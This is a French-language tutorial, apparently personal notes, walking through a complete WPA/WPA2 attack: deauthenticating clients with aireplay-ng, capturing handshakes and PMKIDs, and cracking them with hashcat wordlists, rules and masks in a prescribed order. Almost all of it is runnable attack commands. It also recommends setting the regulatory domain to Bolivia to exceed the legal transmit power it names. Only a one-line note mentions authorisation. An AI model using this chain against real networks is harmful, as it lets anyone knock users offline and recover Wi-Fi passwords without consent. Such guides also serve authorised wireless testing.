# WPA/WPA2 — capture de handshake et cracking

Chaîne complète : capture manuelle avec `aircrack-ng` sur Alfa AWUS, puis cracking GPU sous hashcat.
L'intérêt du manuel par rapport à Wifite : tu contrôles quand tu t'arrêtes, donc tu ne clôtures pas la capture sur un handshake partiel que `tshark` valide mais qu'`aircrack` refuse.

> Usage sur ton propre matériel ou sur un périmètre pour lequel tu as une autorisation écrite.

**Architecture de travail** — la radio et le crack ne vivent pas au même endroit :

| Étape | Où | Pourquoi |
|---|---|---|
| Capture (monitor + injection) | VM Kali avec passthrough USB | WSL2 n'expose pas `mac80211` |
| Cracking | Windows natif, hashcat + RTX | Sous WSL, hashcat ne voit que l'iGPU Intel |

---

# PARTIE 1 — CAPTURE

## 1. Matériel — spécificités Alfa AWUS

| Modèle | Chipset | Bandes | Driver | Remarque |
|---|---|---|---|---|
| AWUS036NHA | Atheros AR9271 | 2.4 GHz | `ath9k_htc` (in-kernel) | Le plus fiable, driver natif, zéro config |
| AWUS036ACH | Realtek RTL8812AU | 2.4 + 5 GHz | `88XXau` (DKMS) | Puissant mais driver capricieux |
| AWUS036ACM | MediaTek MT7612U | 2.4 + 5 GHz | `mt76x2u` (in-kernel) | Bon compromis, monitor+injection stables |
| AWUS036AXML | MT7921AU | 2.4/5/6 GHz | `mt7921u` | Wi-Fi 6E, support monitor variable |

### Installer le driver (Realtek uniquement)

Les chipsets Atheros et MediaTek sont pris en charge nativement. Pour un AWUS036ACH :

```bash
sudo apt update
sudo apt install realtek-rtl88xxau-dkms
```

Puis rebrancher l'adaptateur.

### Vérifier que l'adaptateur est reconnu

```bash
lsusb
ip link
iw dev
```

Note le nom de l'interface (`wlan0`, `wlan1`…), il sert partout ensuite.

### Vérifier le support monitor + injection

```bash
iw list | grep -A 10 "Supported interface modes"
```

Tu dois voir `monitor` dans la liste.

> **WSL2 : ça ne marchera pas.** Le noyau WSL n'expose pas la stack `mac80211`, et le passthrough USB via `usbipd` ne donne pas accès aux fonctions radio bas niveau. Il faut une VM avec passthrough USB direct (VirtualBox/VMware) ou un boot live Kali.

---

## 2. Préparer l'interface

### Tuer les processus qui interfèrent

`NetworkManager` et `wpa_supplicant` reprennent la main sur l'interface et cassent le mode monitor.

```bash
sudo airmon-ng check kill
```

### Passer en mode monitor

```bash
sudo airmon-ng start wlan0
```

L'interface est parfois renommée en `wlan0mon` — vérifie avec `iw dev`, tu dois lire `type monitor`. Selon le driver et la version, elle peut aussi garder son nom d'origine ; adapte les commandes suivantes en conséquence.

**Méthode alternative** (sans renommage, utile si `airmon-ng` se plante avec les drivers Realtek) :

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Augmenter la puissance d'émission (optionnel)

```bash
sudo iw reg set BO
sudo iw dev wlan0 set txpower fixed 30dBm
```

`BO` (Bolivie) autorise une puissance plus élevée que la réglementation UE. En France/Espagne le plafond légal est 20 dBm (100 mW) en 2.4 GHz.

---

## 3. Reconnaissance — repérer la cible

```bash
sudo airodump-ng wlan0
```

Pour balayer aussi le 5 GHz (adaptateurs dual-band) :

```bash
sudo airodump-ng --band abg wlan0
```

### Lire la sortie

Partie haute — les points d'accès :

| Colonne | Signification |
|---|---|
| `BSSID` | MAC du point d'accès |
| `PWR` | Puissance du signal (plus proche de 0 = meilleur) |
| `CH` | Canal |
| `ENC` / `CIPHER` / `AUTH` | Chiffrement (cherche `WPA2` / `CCMP` / `PSK`) |
| `ESSID` | Nom du réseau |

Partie basse — les clients associés :

| Colonne | Signification |
|---|---|
| `STATION` | MAC du client |
| `Frames` | Trafic — un client actif se reconnecte plus vite |
| `Notes` | Affiche `EAPOL` quand des trames de handshake ont été vues |

Note le **BSSID**, le **canal** et au moins une **STATION** active.

> Un `PWR` autour de -40 / -55 est confortable. À -70 et au-delà, tu captures des trames EAPOL corrompues — c'est la cause principale du `tshark: valid` / `aircrack: not valid`.

> Un BSSID commençant par `D2`, `02`, `06`, `0A`, `0E`… est une adresse **localement administrée** : c'est un AP logiciel (hostapd, partage de connexion), pas un routeur d'usine.

---

## 4. Capture ciblée

Verrouille sur le canal et le BSSID, et écris dans un fichier :

```bash
sudo airodump-ng -c 8 --bssid D2:AF:CA:89:2F:C3 -w capture wlan0
```

| Option | Rôle |
|---|---|
| `-c 8` | Verrouille le canal — indispensable, sinon le channel hopping fait rater les trames EAPOL |
| `--bssid` | Filtre sur la cible uniquement |
| `-w capture` | Préfixe des fichiers de sortie (`capture-01.cap`, `capture-01.csv`…) |

**Laisse ce terminal tourner.** C'est lui qui te dira quand le handshake est complet — et il maintient aussi l'interface sur le bon canal pour `aireplay-ng`.

---

## 5. Déauthentification

Dans un **second terminal**, sans fermer le premier.

### Synchronisation de canal — l'erreur la plus fréquente

```
wlan0 is on channel 6, but the AP uses channel 8
```

`aireplay-ng` n'injecte que si l'interface est physiquement sur le canal de l'AP. Deux solutions :

```bash
# Ponctuel
sudo iw dev wlan0 set channel 8
```

```bash
# Durable — laisser airodump verrouillé sur le canal dans le terminal 1
# il maintient le canal en permanence, aireplay trouve le beacon sans râler
```

Le réglage manuel via `iw` saute dès qu'un autre process touche l'interface : préfère la seconde méthode.

> Si c'est ton AP, **fixe le canal en dur** dans sa configuration. La sélection automatique le redéplace dès qu'il détecte des interférences, ce qui coupe la capture en plein milieu. Utilise 1, 6 ou 11 (canaux non chevauchants en 2.4 GHz).

### Cibler un client précis (recommandé)

Bien plus efficace que le broadcast : beaucoup de clients ignorent les deauth diffusées.

```bash
sudo aireplay-ng -0 4 -a D2:AF:CA:89:2F:C3 -c 40:31:3C:AE:02:D6 wlan0
```

| Option | Rôle |
|---|---|
| `-0 4` | 4 rafales de deauth (`-0 0` = en continu, à éviter) |
| `-a` | BSSID de l'AP |
| `-c` | MAC du client à déconnecter |

### Broadcast (tous les clients)

```bash
sudo aireplay-ng -0 4 -a D2:AF:CA:89:2F:C3 wlan0
```

### Dosage

Envoie **peu de rafales à la fois** (3 à 5), puis regarde le terminal airodump. Spammer en continu est contre-productif : le client n'a jamais la fenêtre pour terminer sa reconnexion, donc tu captures des handshakes tronqués. C'est la cause n°1 des captures partielles — et ce que fait Wifite par défaut.

Attends 10-15 secondes entre deux séries.

### Test d'injection

```bash
sudo aireplay-ng --test wlan0
```

Doit répondre `Injection is working!`. Sinon le driver ne supporte pas l'injection — cas fréquent avec les RTL8812AU mal compilés.

---

## 6. Reconnaître un handshake complet

Trois signaux à vérifier dans la sortie `airodump-ng` :

```
CH  8 ][ Elapsed: 1 min ][ WPA handshake: D2:AF:CA:89:2F:C3
                            ^^^^^^^^^^^^^ (1)

BSSID              STATION            PWR   Rate    Lost  Frames  Notes
D2:AF:CA:89:2F:C3  40:31:3C:AE:02:D6  -43   24e- 1    52      16  EAPOL
                                      ^^^                        ^^^^^
                                      (2)                         (3)
```

1. **`WPA handshake:` dans l'en-tête** — validation d'airodump
2. **`PWR` > -60** — zone de signal fiable
3. **`EAPOL` dans la colonne Notes** — les trames de handshake ont bien été vues pour ce client

Tant que le point 1 n'apparaît pas, **continue**. C'est toute la différence avec Wifite, qui coupe dès que tshark est content.

Une fois affiché : `Ctrl+C` sur les deux terminaux.

### Valider avec aircrack

```bash
aircrack-ng capture-01.cap
```

Tu dois lire `(1 handshake)` en face du BSSID. Si `(0 handshakes)`, reprends l'étape 5.

### Validation plus fine avec hcxpcapngtool

```bash
hcxpcapngtool -o test.hc22000 capture-01.cap
```

La sortie détaille ce qui a été trouvé :

| Trouvé | Verdict |
|---|---|
| `EAPOL M2M3` | Le meilleur cas — MIC calculé sur des nonces confirmés |
| `EAPOL M1M2` avec M2 valide | Crackable |
| `M1` seul | Inutilisable |
| `RSN PMKID` | Crackable, aucun client requis |

---

## 7. Nettoyer la capture

`airodump-ng` capture tout le trafic du canal, le `.cap` contient beaucoup de bruit :

```bash
wpaclean clean.cap capture-01.cap
aircrack-ng clean.cap
```

---

## 8. Convertir pour hashcat

```bash
hcxpcapngtool -o handshake.hc22000 clean.cap
cat handshake.hc22000
```

Le fichier doit commencer par `WPA*` :

| Préfixe | Type |
|---|---|
| `WPA*01*` | PMKID |
| `WPA*02*` | EAPOL (handshake 4-way) |

Pour ne garder que l'EAPOL :

```bash
grep '^WPA\*02\*' handshake.hc22000 > eapol_only.hc22000
```

---

## 9. Repasser en mode managed

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

# PARTIE 2 — TRANSFERT VM → WINDOWS

## 10. Sortir le fichier de la VM

### Option A — Dossier partagé VirtualBox (permanent)

**Côté VirtualBox** : Configuration → Dossiers partagés → « + »
- **Chemin** : `C:\pentest-share`
- **Nom** : `share`
- Cocher **Montage automatique** et **Configuration permanente**

**Côté Kali** :

```bash
sudo apt install virtualbox-guest-utils virtualbox-guest-x11
sudo usermod -aG vboxsf kali
# redémarrer la VM — le changement de groupe ne prend effet qu'à la reconnexion
ls /media/sf_share
```

Montage manuel si l'auto échoue :

```bash
sudo mkdir -p /mnt/share
sudo mount -t vboxsf share /mnt/share
```

Permanent via `/etc/fstab` :

```
share /mnt/share vboxsf defaults,uid=1000,gid=1000 0 0
```

### Option B — Serveur HTTP (ponctuel, zéro config)

```bash
cd ~/hs
python3 -m http.server 8000
ip a | grep "inet "
```

Depuis Windows :

```powershell
Invoke-WebRequest -Uri "http://<IP_KALI>:8000/handshake.hc22000" -OutFile "C:\Users\alban\Downloads\handshake.hc22000"
```

> En NAT, l'IP de la VM n'est pas joignable. Passe l'interface en **Accès par pont**, ou ajoute une redirection de port (hôte 8000 → invité 8000) et utilise `http://127.0.0.1:8000`.

---

# PARTIE 3 — CRACKING GPU

## 11. Les deux paramètres obligatoires

### `-m` — le type de hash

| Mode | Type |
|---|---|
| `0` | MD5 |
| `100` | SHA1 |
| `1000` | NTLM |
| `1800` | sha512crypt |
| `3200` | bcrypt |
| `13100` | Kerberoast (TGS-REP) |
| `18200` | AS-REP roast |
| **`22000`** | **WPA-PBKDF2-PMKID+EAPOL** |

Un mauvais `-m` produit `Separator unmatched` — hashcat ne sait pas interpréter le fichier.

### `-a` — le mode d'attaque

| Mode | Nom | Génère |
|---|---|---|
| `-a 0` | Straight (dictionnaire) | Chaque ligne de la wordlist, éventuellement mutée par `-r` |
| `-a 1` | Combinator | Liste1 × Liste2 concaténées |
| `-a 3` | Masque / bruteforce | Selon un motif (`?d?d?d?d` = 4 chiffres) |
| `-a 6` | Hybride wordlist + masque | `password` + `?d?d` → `password42` |
| `-a 7` | Hybride masque + wordlist | `?d?d` + `password` → `42password` |

### Charsets pour `-a 3`, `-a 6`, `-a 7`

| Symbole | Contenu |
|---|---|
| `?l` | a-z |
| `?u` | A-Z |
| `?d` | 0-9 |
| `?s` | spéciaux |
| `?a` | tout (`?l?u?d?s`) |

Charsets personnalisés via `-1` à `-4` : `-1 ?l?d ?1?1?1?1?1?1?1?1` = 8 caractères alphanumériques minuscules.

### Autres flags

| Flag | Rôle |
|---|---|
| `-r` | Fichier de rules (mode `-a 0` uniquement) |
| `-w 1..4` | Workload : 3 = high, 4 = rend la machine inutilisable |
| `-O` | Kernels optimisés — **indisponible sur m 22000**, hashcat bascule sur le kernel pur |
| `--show` | Affiche les hashes déjà cassés (depuis `hashcat.potfile`) |
| `--status --status-timer 10` | Progression et ETA rafraîchis toutes les 10 s |

---

## 12. Le facteur qui change tout : le coût par candidat

WPA utilise PBKDF2 avec 4096 itérations. Ordres de grandeur sur RTX 4070 Laptop :

| Type | Vitesse approx. |
|---|---|
| NTLM | ~100 GH/s |
| MD5 | ~60 GH/s |
| **WPA (m 22000)** | **~500 kH/s – 1 MH/s** |

Cinq ordres de grandeur d'écart. Conséquence directe sur les rules :

| Rule | Nb règles | rockyou × rule | ETA ~700 kH/s |
|---|---|---|---|
| `top10_2025.rule` | 10 | ~140 M | ~3 min |
| `best66.rule` | 66 | ~900 M | ~20 min |
| `T0XlC.rule` | ~4 000 | ~56 Md | ~22 h |
| `OneRule` | ~50 000 | ~700 Md | ~11 jours |
| `dive.rule` | ~99 000 | ~1 400 Md | ~23 jours |

`dive` et `OneRule` sont excellentes sur des hashes rapides. Sur du WPA elles sont hors de portée.

**Sur WPA : rules courtes, wordlists ciblées.**

---

## 13. Wordlists

### Ce qui est le plus rentable

```powershell
dir "C:\Users\alban\SecLists\Passwords\WiFi-WPA\"
```

`probable-v2-wpa-top4800.txt` et ses variantes sont construites à partir de mots de passe WiFi réellement observés et déjà filtrées sur la contrainte de longueur. Meilleur point de départ que rockyou.

### Filtrer pour WPA (8 à 63 caractères)

Rockyou contient des millions d'entrées trop courtes — testées puis rejetées, mais elles consomment du temps :

```powershell
Get-Content "C:\Users\alban\Downloads\rockyou.txt" |
  Where-Object { $_.Length -ge 8 -and $_.Length -le 63 } |
  Set-Content "C:\Users\alban\Downloads\rockyou-wpa.txt"
```

Retire environ 60 % de rockyou. Attention : avec une rule qui *ajoute* des caractères, un mot de 6 lettres devient valide — ne filtre pas si tu comptes sur les rules pour rallonger.

### Listes plus grandes

| Source | Taille | Note |
|---|---|---|
| SecLists | ~1 Go | Le mieux trié, `Passwords/` suffit |
| CrackStation human-only | ~680 Mo | Bon rapport résultats/temps |
| CrackStation complète | 15 Go (65 Go déc.) | Surtout des chaînes aléatoires — inutile sur WPA |
| Weakpass | jusqu'à des dizaines de Go | Vérifier l'espace disque d'abord |
| Kaonashi | — | Wordlist + rules pensées ensemble pour mots de passe humains longs |

Clone partiel de SecLists (uniquement les mots de passe) :

```powershell
git clone --filter=blob:none --sparse https://github.com/danielmiessler/SecLists.git
cd SecLists
git sparse-checkout set Passwords
```

---

## 14. Attaques hybrides — mot + date

Le cas le plus fréquent sur un mot de passe personnalisé.

```powershell
# mot + année (4 chiffres)
.\hashcat.exe -m 22000 -a 6 handshake.hc22000 es.txt ?d?d?d?d -w 3

# restreint aux années plausibles — ÷5 sur le temps
.\hashcat.exe -m 22000 -a 6 handshake.hc22000 es.txt 19?d?d -w 3
.\hashcat.exe -m 22000 -a 6 handshake.hc22000 es.txt 20?d?d -w 3

# année AVANT le mot
.\hashcat.exe -m 22000 -a 7 handshake.hc22000 ?d?d?d?d es.txt -w 3
```

### Générer des listes de dates en PowerShell

```powershell
# années 1950-2026
1950..2026 | Out-File -Encoding ascii C:\Users\alban\Downloads\years.txt

# JJMM
$dates = foreach ($m in 1..12) { foreach ($d in 1..31) { "{0:D2}{1:D2}" -f $d,$m } }
$dates | Out-File -Encoding ascii C:\Users\alban\Downloads\ddmm.txt
```

Puis en combinator :

```powershell
.\hashcat.exe -m 22000 -a 1 handshake.hc22000 es.txt years.txt -w 3
```

### Par rules — déjà présent dans hashcat

`rules\T0XlC-insert_00-99_1950-2050_toprules_0_F.rule` insère des nombres 00-99 et des années 1950-2050 à différentes positions — début, milieu et fin, pas seulement en suffixe :

```powershell
.\hashcat.exe -m 22000 -a 0 handshake.hc22000 es.txt -r "rules\T0XlC-insert_00-99_1950-2050_toprules_0_F.rule" -w 3
```

### Filtrer la wordlist de base

Avec un suffixe de 4 chiffres, les mots doivent faire ≥ 4 lettres :

```powershell
Get-Content es.txt | Where-Object { $_.Length -ge 4 } | Set-Content es4.txt
```

---

## 15. Ordre d'attaque recommandé

Du plus rapide au plus coûteux — arrête-toi dès que ça tombe.

```powershell
cd C:\hashcat-7.1.2\hashcat-7.1.2

# 1. Liste WPA dédiée, sans rule — quelques secondes
.\hashcat.exe -m 22000 -a 0 "C:\Users\alban\Downloads\handshake.hc22000" `
  "C:\Users\alban\SecLists\Passwords\WiFi-WPA\probable-v2-wpa-top4800.txt" -w 3

# 2. Même liste + best66 — quelques minutes
.\hashcat.exe -m 22000 -a 0 "C:\Users\alban\Downloads\handshake.hc22000" `
  "C:\Users\alban\SecLists\Passwords\WiFi-WPA\probable-v2-wpa-top4800.txt" `
  -r rules\best66.rule -w 3

# 3. Rockyou filtré + best66 — ~20 min
.\hashcat.exe -m 22000 -a 0 "C:\Users\alban\Downloads\handshake.hc22000" `
  "C:\Users\alban\Downloads\rockyou-wpa.txt" -r rules\best66.rule -w 3

# 4. Masques numériques — mots de passe par défaut FAI
.\hashcat.exe -m 22000 -a 3 "C:\Users\alban\Downloads\handshake.hc22000" ?d?d?d?d?d?d?d?d -w 3

# 5. Hybride mot + date
.\hashcat.exe -m 22000 -a 6 "C:\Users\alban\Downloads\handshake.hc22000" `
  "C:\Users\alban\Downloads\es4.txt" 19?d?d -w 3

# 6. Grosse liste, sans rule — en dernier
.\hashcat.exe -m 22000 -a 0 "C:\Users\alban\Downloads\handshake.hc22000" `
  "C:\Users\alban\Downloads\crackstation-human-only.txt" -w 3
```

### Retrouver un résultat déjà obtenu

```powershell
.\hashcat.exe -m 22000 "C:\Users\alban\Downloads\handshake.hc22000" --show
```

### Vérifier que le GPU est bien exploité

```powershell
.\hashcat.exe -I
```

Le message `CUDA SDK Toolkit not installed` signifie que hashcat tourne en fallback OpenCL. Ça fonctionne, mais l'installation du CUDA Toolkit (developer.nvidia.com/cuda-downloads) débloque des performances supérieures.

---

# PARTIE 4 — RÉSOLUTION DE PROBLÈMES

## `tshark: valid` mais `aircrack: not valid`

Handshake partiel. Causes par ordre de fréquence :

1. **Trop de deauth d'un coup** — réduis à 3-4 rafales, laisse le temps à la reconnexion
2. **Signal trop faible** — rapproche-toi, vise un `PWR` > -60
3. **Canal non verrouillé** — vérifie que `-c` est bien passé à airodump
4. **AP en sélection automatique de canal** — il a changé de canal en cours de capture
5. **Client inactif** — cible une STATION dont le compteur `Frames` monte

## `wlan0 is on channel X, but the AP uses channel Y`

```bash
sudo iw dev wlan0 set channel Y
```

Ou garde `airodump-ng -c Y` en parallèle, qui maintient le canal.

## Le mode monitor ne tient pas

```bash
sudo airmon-ng check kill
sudo systemctl stop NetworkManager wpa_supplicant
```

## `Separator unmatched` sous hashcat

Le chemin du fichier n'est pas résolu — hashcat lit le chemin lui-même comme si c'était un hash. Sous WSL/Kali, un chemin Windows `C:\...` n'existe pas : utilise `/mnt/c/...`.

## Aucun client visible

Sans client connecté, pas de handshake 4-way possible. Alternative — le PMKID, qui n'en nécessite aucun :

```bash
sudo hcxdumptool -i wlan0 -w pmkid.pcapng --enable_status=1
```

---

## Récapitulatif — séquence minimale

```bash
# --- VM Kali ---
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0                                          # recon

# Terminal 1
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0
# Terminal 2
sudo aireplay-ng -0 4 -a <BSSID> -c <CLIENT> wlan0

# Validation + conversion
aircrack-ng capture-01.cap
wpaclean clean.cap capture-01.cap
hcxpcapngtool -o handshake.hc22000 clean.cap

# Retour à la normale
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

```powershell
# --- Windows ---
cd C:\hashcat-7.1.2\hashcat-7.1.2
.\hashcat.exe -m 22000 -a 0 "C:\Users\alban\Downloads\handshake.hc22000" `
  "C:\Users\alban\SecLists\Passwords\WiFi-WPA\probable-v2-wpa-top4800.txt" `
  -r rules\best66.rule -w 3 --status --status-timer 10
```
